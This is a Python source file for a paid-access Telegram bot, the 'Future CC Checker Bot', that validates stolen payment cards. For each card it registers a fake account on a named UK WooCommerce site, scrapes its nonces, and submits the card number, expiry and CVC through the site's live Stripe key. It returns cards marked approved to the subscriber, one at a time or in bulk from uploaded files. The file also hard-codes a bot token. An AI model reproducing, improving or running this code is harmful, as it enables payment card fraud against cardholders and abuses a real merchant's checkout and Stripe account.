import telebot
import requests
import random
import string
import time
import re
from datetime import datetime, timedelta

BOT_TOKEN = '7811265876:AAGMgmBsLgnioIZRnDOr395Hw2L9Hd98lYw'
OWNER_ID = 6957690997
PREMIUM_FILE = 'premium.txt'

bot = telebot.TeleBot(BOT_TOKEN)

def load_premium_users():
    try:
        with open(PREMIUM_FILE, 'r') as f:
            return {
                int(line.split()[0]): datetime.strptime(line.split()[1], '%Y-%m-%d')
                for line in f.readlines()
            }
    except FileNotFoundError:
        return {}

premium_users = load_premium_users()

def save_premium_users():
    with open(PREMIUM_FILE, 'w') as f:
        for user_id, expiry_date in premium_users.items():
            f.write(f"{user_id} {expiry_date.strftime('%Y-%m-%d')}\n")

def is_authorized(user_id):
    return user_id in premium_users and premium_users[user_id] > datetime.now()

def add_premium_user(user_id, days):
    expiry_date = datetime.now() + timedelta(days=days)
    premium_users[user_id] = expiry_date
    save_premium_users()

def unauthorized_message(message):
    bot.send_message(
        message.chat.id,
        "🚫 Unauthorized access detected. Please contact @Titan_kumar to gain access."
    )

@bot.message_handler(commands=['start'])
def start(message):
    if not is_authorized(message.from_user.id):
        return unauthorized_message(message)
    msg = bot.send_message(message.chat.id, "Bot is booting up 🚀 [□□□□□□□□□□]")
    for i in range(10):
        bot.edit_message_text(f"Bot is booting up 🚀 [{('■' * (i + 1)).ljust(10, '□')}]", message.chat.id, msg.id)
        time.sleep(0.2)
    bot.edit_message_text(
        "🚀 Welcome to the Future CC Checker Bot!\nUse /help to see available commands. 🌟", 
        msg.chat.id, 
        msg.id
    )

@bot.message_handler(commands=['help'])
def help_command(message):
    if not is_authorized(message.from_user.id):
        return unauthorized_message(message)
    bot.send_message(message.chat.id, "🛠️ **Available Commands:**\n\n/chk [card] - Check a single CC 💳\n/mchk - Check multiple CCs via file 📄")

@bot.message_handler(commands=['add'])
def add_command(message):
    if message.from_user.id != OWNER_ID:
        return unauthorized_message(message)
    try:
        _, user_id, days = message.text.split()
        user_id = int(user_id)
        days = int(days)
        if days > 365:
            bot.send_message(message.chat.id, "🚫 Maximum subscription limit is 365 days.")
            return
        add_premium_user(user_id, days)
        bot.send_message(message.chat.id, f"✅ User {user_id} added with a {days}-day subscription.")
    except ValueError:
        bot.send_message(message.chat.id, "❌ Invalid format. Use: `/add <user_id> <days>`")

@bot.message_handler(commands=['chk'])
def check_cc(message):
    if not is_authorized(message.from_user.id):
        return unauthorized_message(message)
    try:
        cc = message.text.split()[1]
        msg = bot.send_message(message.chat.id, "Processing your CC 💳")
        result = process_single_cc(cc)
        bot.send_message(message.chat.id, result)
    except IndexError:
        bot.send_message(message.chat.id, "❌ Invalid format. Use: `/chk 4934740000721153|10|2027|817`")

@bot.message_handler(commands=['mchk'])
def multi_check_cc(message):
    if not is_authorized(message.from_user.id):
        return unauthorized_message(message)
    bot.send_message(message.chat.id, "📄 Send the text file containing CCs now.")

@bot.message_handler(content_types=['document'])
def handle_file(message):
    if not is_authorized(message.from_user.id):
        return unauthorized_message(message)
    try:
        file_info = bot.get_file(message.document.file_id)
        downloaded_file = bot.download_file(file_info.file_path)
        cc_list = downloaded_file.decode('utf-8').strip().splitlines()
        bot.send_message(message.chat.id, "Processing your CCs ✅")

        approved = []
        for cc in cc_list:
            result = process_single_cc(cc)
            if "APPROVED ✅" in result:
                approved.append(cc)
                bot.send_message(message.chat.id, result)

        response = f"✅ **Approved Cards:** {len(approved)}\n"
        bot.send_message(message.chat.id, response)

        if approved:
            approved_file = "\n".join(approved)
            with open("approved_cards.txt", "w") as f:
                f.write(approved_file)
            with open("approved_cards.txt", "rb") as f:
                bot.send_document(message.chat.id, f)
    except Exception as e:
        bot.send_message(message.chat.id, f"❌ Error processing file: {str(e)}")

def process_single_cc(cc):
    try:
        session = requests.Session()
        headers = {'user-agent': generate_user_agent()}
        response = session.get('https://caretuition.co.uk/my-account/', headers=headers)
        nonce = re.search(r'id="woocommerce-register-nonce".*?value="(.*?)"', response.text).group(1)
        acc = generate_email()
        data = {
            'email': acc,
            'woocommerce-register-nonce': nonce,
            '_wp_http_referer': '/my-account/',
            'register': 'Register',
        }
        session.post('https://caretuition.co.uk/my-account/', headers=headers, data=data)
        response = session.get('https://caretuition.co.uk/my-orders/add-payment-method/', headers=headers)
        noncec = re.search(r'"add_card_nonce"\s*:\s*"([^"]+)"', response.text).group(1)
        stripe_headers = {
            'authority': 'api.stripe.com',
            'accept': 'application/json',
            'content-type': 'application/x-www-form-urlencoded',
            'user-agent': generate_user_agent(),
            'referer': 'https://js.stripe.com/',
        }
        stripe_data = f'type=card&billing_details[name]=+&billing_details[email]={acc}&card[number]={cc.split("|")[0]}&card[cvc]={cc.split("|")[3]}&card[exp_month]={cc.split("|")[1]}&card[exp_year]={cc.split("|")[2]}&key=pk_live_51KbjCnJuu9Qhmk4PaXnL2pfLANOtnAVlLiq9b4rCK0Gf79YsczSWMv3FdgOGxAMt6MyUm7fR9KSVUqY5jr24jBP100mDQDh2KQ'
        stripe_response = session.post('https://api.stripe.com/v1/payment_methods', headers=stripe_headers, data=stripe_data)
        stripe_json = stripe_response.json()
        stripe_id = stripe_json.get('id', None)
        if stripe_id:
            data = {
                'stripe_source_id': stripe_id,
                'nonce': noncec,
            }
            final_response = session.post(
                'https://caretuition.co.uk/', 
                params={'wc-ajax': 'wc_stripe_create_setup_intent'}, 
                headers=headers, 
                data=data
            )
            response_json = final_response.json()
            if response_json.get('status') == 'success':
                return (
                    f"🌟 **APPROVED ✅**\n"
                    f"💳 **CARD:** {cc}\n"
                    f"📋 **Status:** APPROVED\n"
                    f"🔑 **Gateway:** STRIPE AUTH\n"
                    f"📜 **Raw Response:** {response_json}\n"
                    f"👨‍💻 **Developed by:** @Titan_kumar"
                )
        return (
            f"❌ **DECLINED ❌**\n"
            f"💳 **CARD:** {cc}\n"
            f"📋 **Status:** DECLINED\n"
            f"🔑 **Gateway:** STRIPE AUTH\n"
            f"📜 **Raw Response:** {stripe_json}\n"
            f"👨‍💻 **Developed by:** @Titan_kumar"
        )
    except Exception as e:
        return (
            f"❌ **DECLINED ❌**\n"
            f"💳 **CARD:** {cc}\n"
            f"📋 **Status:** DECLINED\n"
            f"📋 **Error:** {str(e)}\n"
            f"👨‍💻 **Developed by:** @Titan_kumar"
        )

def generate_user_agent():
    return 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36'

def generate_email():
    domains = ["google.com", "live.com", "yahoo.com", "hotmail.org"]
    name_length = 8
    name = ''.join(random.choices(string.ascii_lowercase + string.digits, k=name_length))
    domain = random.choice(domains)
    return f"{name}@{domain}"

bot.polling()
